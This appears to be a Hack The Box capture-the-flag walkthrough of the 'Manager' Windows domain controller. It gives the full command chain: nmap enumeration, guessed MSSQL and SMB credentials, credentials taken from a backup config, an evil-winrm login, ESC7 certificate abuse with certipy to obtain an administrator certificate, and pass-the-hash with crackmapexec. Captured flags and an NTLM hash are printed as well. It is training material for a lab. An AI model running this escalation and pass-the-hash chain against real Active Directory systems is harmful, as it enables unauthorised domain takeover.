# Manager

This is my Walkthrough on [Manager](https://app.hackthebox.com/machines/Manager) - The Hack The Box Seasonal Machine

## Initial Scan

```nmap
sudo nmap -T4 -Pn -sV -sC -v 10.129.74.218 -oA Manager
```

\*\*Had to shutdown to IP changed to `10.129.74.218` for some later things

<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-24 03:15:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-24T03:16:52+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-24T03:16:52+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-24T03:13:49
| Not valid after:  2053-10-24T03:13:49
| MD5:   9e80:5b78:fbe6:b024:994f:f4b5:620b:15b2
|_SHA-1: dcd7:2c60:befc:7812:2a99:38fa:1637:2748:43a0:0698
| ms-sql-ntlm-info: 
|   10.129.74.218:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.74.218:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-10-24T03:16:52+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2023-10-24T03:16:52+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2023-10-24T03:16:52+00:00; +7h00m00s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Findings

### HTTP

Not a lot to the website, no logon forms or any hidden directories

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

#### Dirbuster/Gobuster

<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

#### SMB

<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

Directories are empty, C$ and ADMIN$ we don't have access by default.

BUT we were able to find the users with CrackMapExec and trying various passwords(username as pass but upper and lower), we find a valid user/password combination: `Operator:operator`

&#x20;&#x20;

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

### RPC

```bash
rpcclient -U "" 10.129.74.218
```

Not much found here but we did find the SID of the Administrator account

```
rpcclient $> lookupnames Administrator
Administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1
```

### SQL

#### Impacket-mssqlclient

Were able to log in with `Operator:operator`&#x20;

<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

Using xp\_dirtree to look around in various directories we eventually found:&#x20;

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

Grabbed the .zip file

```
http://10.129.75.78/website-backup-27-07-23-old.zip
```

<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

#### .old-conf.xml

<figure><img src="../../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>

More user creds! We found `Raven@manager.htb:R4v3nBe5tD3veloP3r!123`

### winrm

```bash
evil-winrm -i 10.129.75.78 -u Raven -p 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

User flag was found under user.txt on Ravens desktop: `5ba4881af698a98cbf340a8861580333`

## Priv Esc

Looked around at what permissions Raven had

<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

### WinPEAS

<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

Nothing of super note was found with WinPeas unfortunately

### certipy

We checked with Certipy due it being Active Directory and on a DC. So we want to enumerate certificates.

<figure><img src="../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

```bash
certipy-ad find -vulnerable -u raven@dc01.manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.139.52 -stdout
```

We see ESC7 is vulnerable - [On the certipy github on ESC7](https://github.com/ly4k/Certipy#esc7). Upgrade Ravens account to have additional permissions. These had to be done in qucik succession as the machine does reset itself every few minutes.

```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash"><code class="lang-bash"><strong>certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
</strong></code></pre>

```bash
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
```

<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

```bash
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
```

<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

We now have our administrator.pfx and we can use this.

```bash
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.129.139.52
```

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

We need to sync our clock with the DC. We we can use rdate(need to install it) to get the time of the DC Server

```bash
sudo apt install -y rdate
sudo rdate -n dc01.manager.htb
```

<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

Then use faketime to sync the clock

```bash
sudo apt install -y rdate
sudo faketime -f '(date/time of dc)'/bin/date
```

<figure><img src="../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

Re-run our certipy command and get the hash of the administrator!&#x20;

<figure><img src="../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

Administrator NTLM hash: `aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef`

Rather than try to crack it, we can use CrackMapExec to pass the hash and execute commands

```bash
crackmapexec smb 10.129.139.52 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -x 'dir C:\Users\Administrator\Desktop'
```

```bash
crackmapexec smb 10.129.139.52 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -x 'type C:\Users\Administrator\Desktop\root.txt'
```

<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

Root.txt: `35891a19f5ad0f5c2fced375b3c7142e`
